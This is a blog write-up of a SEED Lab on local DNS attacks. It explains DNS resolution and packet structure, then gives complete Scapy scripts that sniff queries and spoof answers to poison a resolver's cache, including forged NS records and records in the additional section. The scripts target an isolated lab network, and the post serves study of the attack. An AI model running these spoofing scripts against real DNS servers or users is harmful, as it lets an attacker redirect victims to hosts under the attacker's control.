---
layout: post
title: Local DNS Attack
categories: [scapy, dns]
excerpt: When you want to visit a website on the internet, like your favorite streaming website, i.e., Netflix, you type in `www.netflix.com`. However, the browser does not understand that because computers identify one another via numbers (called IP addresses). The browser needs a way to know the IP address that `www.netflix.com` is associated with. That's where DNS comes in. DNS associates `www.netflix.com` with its IP address.
---

When you want to visit a website on the internet, like your favorite streaming website, i.e., Netflix, you type in `www.netflix.com`. However, the browser does not understand that because computers identify one another via numbers (called IP addresses). The browser needs a way to know the IP address that `www.netflix.com` is associated with. That's where DNS comes in. DNS associates `www.netflix.com` with its IP address.

A DNS Domain is organized as follows: root servers -> TLD servers -> 2LD servers

A DNS zone helps in managing and organizing a large number of domain names efficiently (i.e., it contains a domain and related sub-domains). A DNS zone contains various DNS records (such as A, AAAA, CNAME, MX, etc.) that are defined in the zone file. If required, the sub-domains can be a zone different from the domain, i.e., you can have zones made up of related sub-domains. When this is done, these zones have to register their authoritative NS with the parent zone.

Authoritative NS provides the definitive answers to DNS queries. They are at the tail end. They do not seek answers from other DNS servers. Authoritative NS publish informations about a DNS zone as defined in a zone file.

DNS queries involve getting answers from authoritative NSs. DNS zones on the internet are organized in a tree structure. The root of this tree is called the ROOT zone, and attached to this zone are 13 authoritative NS (a.root-servers.net,..., m.root-server.net). These root NS provide information about the authoritative NS for TLD servers to the DNS resolver when they are queried.

`hosts` file: this is the first place the resolver looks for IP address to hostname mappings on a computer. It is used by the operating system to resolve domain names before sending a request to a DNS server. Entries to this file are done manually. The host file can be found at C:\Windows\System32\drivers\etc\hosts on Windows or /etc/hosts on macOS and Linux.

`resolv.conf` file: this is where the resolver looks for the IP address of the local DNS server (local here means the first server to contact for name resolution). Entries are done automatically when a machine uses DHCP, and any previous entry is overwritten. When a local DNS server gets information from another DNS server, it caches the answer it gets back and attaches a TTL to each entry.

In this post, I aim to document my findings and observations while performing a SEED Lab.

```
router: 10.9.0.11
attacker: 10.9.0.1
local-dns-server: 10.9.0.53
attacker-dns-server: 10.9.0.153
user: 10.9.0.5
```

<br>

### Testing the DNS Setup
Local DNS server:
- DNS servers now randomize the source port number in their DNS queries; for this lab, the source port number will be fixed.
- DNSSEC has also been turned off to see how attacks work without this protection mechanism.
- A forward zone is added to the local DNS server so that queries to the attacker32.com domain will be forwarded to this domain’s nameserver, which is hosted in the attacker container.

```
zone "attacker32.com" {
type forward;
forwarders {
10.9.0.153;
};
};
```

Attacker DNS-Server:
For the attacker DNS server, two DNS zones are created.

```
zone "attacker32.com" {
type master;
file "/etc/bind/attacker32.com.zone";
};

zone "example.com" {
type master;
file "/etc/bind/example.com.zone";
};
```

***Get the IP address of `ns.attacker32.com`. `$ dig ns.attacker32.com`***

![test-1](https://github.com/iukadike/iukadike.github.io/assets/58455326/3f39ff7d-c085-4464-9daa-709befa26c66)

***Get the IP address of `www.example.com` via the local DNS server. `$ dig www.example.com`***

![test-2](https://github.com/iukadike/iukadike.github.io/assets/58455326/2b849b62-cc41-4f60-b474-20f3e089ee0f)

***Get the IP address of `www.example.com` via the attacker DNS server. `$ dig @ns.attacker32.com www.example.com`***

![test-3](https://github.com/iukadike/iukadike.github.io/assets/58455326/c9941929-45a8-4686-83cc-cbeaaf6bfda4)

<br>

The objective of this lab is to get the victims to ask `ns.attacker32.com` for the IP address of `www.example.com`. 

<br>

##### DNS Packet Structure
The DNS packet structure outlines how DNS packets are organized.

```
+---------------------+
| Header              | DNS header information
+---------------------+
| Question            | Question for the name server
+---------------------+
| Answer              | Answers to the question
+---------------------+
| Authority           | Provides authoritative name servers for the question
+---------------------+
| Additional          | Provides additional data needed to complete the resolution process 
+---------------------+
```

##### DNS header
```
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| ID                                            | Used to identify and associate DNS requests with DNS responses
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|QR| Opcode    |AA|TC|RD|RA| Z      | RCODE     | Flags to indicate the characteristics
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| QDCOUNT                                       | Returns the number of questions asked
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| ANCOUNT                                       | Returns the number of answers in the response
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| NSCOUNT                                       | Returns the number of authoritative name servers in the response
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| ARCOUNT                                       | Returns the number of additional information in the response
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
```

##### DNS Question
```
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| QNAME                                         | The domain to be queried
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| QTYPE                                         | The type of the query (i.e. A, AAAA, MX, etc)
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| QCLASS                                        | The class of the query (usually 'IN')
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
```

##### DNS Answer
```
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| NAME                                          | The domain name that was queried
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| TYPE                                          | The response type
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| CLASS                                         | The RDATA field's class
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| TTL                                           | The maximum amount of time that results can be cached
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
| RDLENGTH                                      | The response data length
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
| RDATA                                         | The response data
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
```

##### example.com zone file 
The following is an excerpt of the zone file that is present on the attacker's DNS server.

```
@       IN      A     1.2.3.4
www     IN      A     1.2.3.5
ns      IN      A     10.9.0.153
*       IN      A     1.2.3.6
```

<br>

###  Directly Spoofing Response to User
Before a web browser sends a request, the computer performs a DNS resolution to get the IP address of the web site. If an attacker is sniffing for traffic, captures the request, and spoofs a response, in as much as the spoofed response comes back to the computer earlier than the real reply, the machine will accept the fake reply.

```python
#!/usr/bin/env python3
from scapy.all import *

NS_NAME = "example.com"

def spoof_dns(pkt):
    if NS_NAME in pkt[DNS].qd.qname.decode():
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
        
        # Create an IP object
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
        
        # Create a UDP object
        udp = UDP(sport = pkt[UDP].dport, dport = pkt[UDP].sport) 
        
        # Create an answer record
        ansec = DNSRR(rrname = pkt[DNS].qd.qname, type = 'A',
            ttl = 1024, rdata = '1.2.3.4')
            
        # Create a DNS object 
        dns = DNS(id = pkt[DNS].id,
            aa = 1, rd = 0, qr = 1, qdcount = 1, ancount = 1,
            qd = pkt[DNS].qd, an = ansec) 
        
        # Send the spoofed DNS packet
        send(ip / udp / dns, verbose=0) 

myFilter = "udp port 53 && src host 10.9.0.5 && (not ether host 02:42:82:ce:39:30)"
print('running...')
sniff(iface='br-eb50d439f380', filter=myFilter, prn=spoof_dns)
```

***python program to spoof DNS response***

![spoof-code](https://github.com/iukadike/iukadike.github.io/assets/58455326/7055719c-7779-435b-9ff8-9fb47b940f84)

***running dig `www.example.com` from victim machine***

![spoof-victim](https://github.com/iukadike/iukadike.github.io/assets/58455326/ddc1fb8e-a478-4796-8756-8dd6111d2b88)

We can see from the screen shot that the address `dig` got back for `www.example.com` was `1.2.3.4, which is the address we used in our Python program. However, this entry is strictly local to the host. It does not affect the records on the DNS server, as seen in the screenshot below.

***the dns cache of the local DNS server***

![spoof-cache](https://github.com/iukadike/iukadike.github.io/assets/58455326/8f8ac5a8-d68d-4eaa-b67f-b5f8f3582435)

Here, after dumping the cache to a file and inspecting it, we can see that the address cached for `www.example.com` was not `1.2.3.4.

<br>

###  DNS Cache Poisoning Attack – Spoofing Answers
The above targeted the user's machine. The records on the local DNS server were not affected. Should we stop the attack and the user try visiting `example.com`, the user will get the legitimate IP from the local DNS server. However, if we feed the local DNS server spoofed records, any time the user queries the local DNS server for the IP address of `example.com`, the user will always get the fake response.

```python
#!/usr/bin/env python3
from scapy.all import *

NS_NAME = "example.com"

def spoof_dns(pkt):
    if NS_NAME in pkt[DNS].qd.qname.decode():
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
        
        # Create an IP object
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
        
        # Create a UDP object
        udp = UDP(sport = pkt[UDP].dport, dport = pkt[UDP].sport) 
        
        # Create an answer record
        ansec = DNSRR(rrname = pkt[DNS].qd.qname, type = 'A',
            ttl = 1024, rdata = '1.2.3.4')
            
        # Create a DNS object 
        dns = DNS(id = pkt[DNS].id,
            aa = 1, rd = 0, qr = 1, qdcount = 1, ancount = 1,
            qd = pkt[DNS].qd, an = ansec) 
        
        # Send the spoofed DNS packet
        send(ip / udp / dns, verbose=0) 

myFilter = "udp port 53 && src host 10.9.0.53 && (not ether host 02:42:82:ce:39:30)"
print('running...')
sniff(iface='br-eb50d439f380', filter=myFilter, prn=spoof_dns)
```

***python program to poison dns cache***

![spoof-poison-code](https://github.com/iukadike/iukadike.github.io/assets/58455326/ade9a99c-18c7-4c58-9df5-ee1130b5c68e)

***running dig `www.example.com` from victim machine***

![spoof-poison-victim](https://github.com/iukadike/iukadike.github.io/assets/58455326/6a856497-4ba1-43b6-880b-ebb6baa4f4ab)

We can see from the screen shot that, as expected, the address `dig` got back for `www.example.com` was `1.2.3.4, which is the address we used in our Python program. However, this entry is not local to the host. It affects the records on the DNS server, as seen in the screenshot below.

***the dns cache of the local dns server***

![spoof-poison-cache](https://github.com/iukadike/iukadike.github.io/assets/58455326/ad29ab53-cbbc-489a-9677-687716f5918a)
 
Here, after dumping the cache to a file and inspecting it, we can see that the cached address for `www.example.com` was `1.2.3.4.

<br>

### Spoofing NS Records
The problem with the above code is that it works only for `www.example.com`. If the user visits another subdomain of `example.com`, we would have to launch another attack. However, by poisoning the local DNS server's NS records cache, we can tell the local DNS server that all resolutions for `example.com` domain should be sent to our DNS server. This can be accomplished by telling the local DNS server that the malicious DNS server is an authoritative server for `example.com` domain.

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
    if NS_NAME in pkt[DNS].qd.qname.decode():
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
        
        # Create an IP object
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
        
        # Create a UDP object
        udp = UDP(sport = pkt[UDP].dport, dport = pkt[UDP].sport) 
        
        # Create an authority record
        nssec = DNSRR(rrname = 'example.com', type = 'NS',
            ttl = 1024, rdata = 'ns.attacker32.com')
            
        # Create a DNS object 
        dns = DNS(id = pkt[DNS].id,
            rd = 0, qr = 1, qdcount = 1, nscount = 1,
            qd = pkt[DNS].qd, ns = nssec) 
        
        # Send the spoofed DNS packet
        send(ip / udp / dns, verbose=0) 

myFilter = "udp port 53 && src host 10.9.0.53 && (not ether host 02:42:82:ce:39:30)"
print('running...')
sniff(iface='br-eb50d439f380', filter=myFilter, prn=spoof_dns)
```

***python program to poison dns cache***

![spoof-ns-code](https://github.com/iukadike/iukadike.github.io/assets/58455326/7b48200f-1544-4293-9216-517181964746)

***running dig `www.example.com` from victim machine***

![spoof-ns-victim-1](https://github.com/iukadike/iukadike.github.io/assets/58455326/33a7ecb8-2dcb-4dbf-abeb-58ebf04c0ccc)

we can see from the screen shot that the address `dig` got back for `www.example.com` was `1.2.3.5`. But wait, what happend to `1.2.3.4`? If we revisit the zone file for `example.com`, we will notice that `www` was mapped to `1.2.3.5`. This means our attack is working.

***running dig `love.example.com` from victim machine***

![spoof-ns-victim-2](https://github.com/iukadike/iukadike.github.io/assets/58455326/35a3bc5a-83f5-468a-aef7-9d77b16cbe01)

We can see from the screen shot that the address `dig` got back for `love.example.com` was `1.2.3.6`. Really? So, what happened to `1.2.3.5`? If we revisit the zone file for `example.com`, we will notice that `*` (meaning any not explicitly defined) was mapped to `1.2.3.6`. This means our attack is working.

***the dns cache of the local dns server***
![spoof-ns-cache](https://github.com/iukadike/iukadike.github.io/assets/58455326/7c45622f-6fb3-4bf2-954f-006d4028201d)

Here, after dumping the cache to a file and inspecting it, we can see that the cached address for `www.example.com` was `1.2.3.5` and that of `love.example.com` was `1.2.3.6`, and the name server for `example.com` was cached.

<br>

### Spoofing NS Records for Another Domain
Excited by the success of the above, we can try to see if we can poison the cache of the DNS server with additional resource records in the authority section.

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
    if NS_NAME in pkt[DNS].qd.qname.decode():
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
        
        # Create an IP object
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
        
        # Create a UDP object
        udp = UDP(sport = pkt[UDP].dport, dport = pkt[UDP].sport) 
            
        # Create an authority record
        nssec1 = DNSRR(rrname = 'example.com', type = 'NS',
            ttl = 1024, rdata = 'ns.attacker32.com')
        nssec2 = DNSRR(rrname = 'google.com', type = 'NS',
            ttl = 1024, rdata = 'ns.attacker32.com')
            
        # Create a DNS object 
        dns = DNS(id = pkt[DNS].id,
            rd = 0, qr = 1, qdcount = 1, ancount = 1, nscount = 2,
            qd = pkt[DNS].qd, ns = nssec1 / nssec2) 
        
        # Send the spoofed DNS packet
        send(ip / udp / dns, verbose=0) 

myFilter = "udp port 53 && src host 10.9.0.53 && (not ether host 02:42:82:ce:39:30)"
print('running...')
sniff(iface='br-eb50d439f380', filter=myFilter, prn=spoof_dns)
```

***running dig `www.example.com` from victim machine***

![spoof-ns-2-victim](https://github.com/iukadike/iukadike.github.io/assets/58455326/f6d863bc-28fd-4438-a035-f742128c9a73)

We can see from the screen shot that, as expected, the address `dig` got back for `www.example.com` was `1.2.3.5`, which is the address present in the `example.com` zone file.

***the dns cache of the local dns server***

![spoof-ns-2-cache](https://github.com/iukadike/iukadike.github.io/assets/58455326/2a326773-a20c-47e6-aef6-32385c12b6f1)

Here, after dumping the cache to a file and inspecting it, we can see the cached address for `www.example.com`, but that of `google.com` was mismatched. Also present is the name server for `example.com`, but the DNS server did not cache our spoofed name server for `google.com`.

<br>

### Spoofing Records in the Additional Section
Since the above did not work, maybe we can use the additional response record section to record IP bindings.

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
    if NS_NAME in pkt[DNS].qd.qname.decode():
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
        
        # Create an IP object
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
        
        # Create a UDP object
        udp = UDP(sport = pkt[UDP].dport, dport = pkt[UDP].sport) 
        
        # Create an answer record
        #ansec = DNSRR(rrname = pkt[DNS].qd.qname, type = 'A',
        #    ttl = 1024, rdata = '1.2.3.4')
            
        # Create an authority record
        nssec1 = DNSRR(rrname = 'example.com', type = 'NS',
            ttl = 1024, rdata = 'ns.attacker32.com')
            
        nssec2 = DNSRR(rrname = 'example.com', type = 'NS',
            ttl = 1024, rdata = 'www.google.com')
      
        # Create an additional record
        arsec1 = DNSRR(rrname = 'www.google.com', type = 'A',
            ttl = 1024, rdata = '5.6.7.8')            
        arsec2 = DNSRR(rrname = 'www.facebook.com', type = 'A',
            ttl = 1024, rdata = '3.4.5.6')
        
        # Create a DNS object 
        dns = DNS(id = pkt[DNS].id,
            rd = 0, qr = 1, qdcount = 1, ancount = 0, nscount = 2, arcount = 2,
            qd = pkt[DNS].qd, ns = nssec1 / nssec2, ar = arsec1 / arsec2)
            #qd = pkt[DNS].qd, an = ansec, ns = nssec1 / nssec2, ar = arsec1 / arsec2 / arsec3) 
        
        # Send the spoofed DNS packet
        send(ip / udp / dns, verbose=0) 

myFilter = "udp port 53 && src host 10.9.0.53 && (not ether host 02:42:82:ce:39:30)"
print('running...')
sniff(iface='br-eb50d439f380', filter=myFilter, prn=spoof_dns)
```

***running dig `www.example.com` from victim machine***

![additional-victim](https://github.com/iukadike/iukadike.github.io/assets/58455326/e01afa21-fe48-4c8a-a77b-d74a72ada614)

We can see from the screen shot that, as expected, the address `dig` got back for `www.example.com` was `1.2.3.5`, which is the address present in the example.com` zone file.

***the dns cache of the local dns server***

![additional-cache](https://github.com/iukadike/iukadike.github.io/assets/58455326/c95ff93f-242e-4c55-adeb-6d1824cef028)

Here, after dumping the cache to a file and inspecting it, we can see that the name server for `example.com` is cached. The name server for `google.com` is also cached; however, the DNS server did not cache our spoofed name server for `google.com`, rather it got the actual name server and cached it. The name server for `facebook.com` was never cached.

<br>

In conclusion, a DNS attack can only be effective when targeting the Answer Record or the Authority Record.

_Thanks for reading_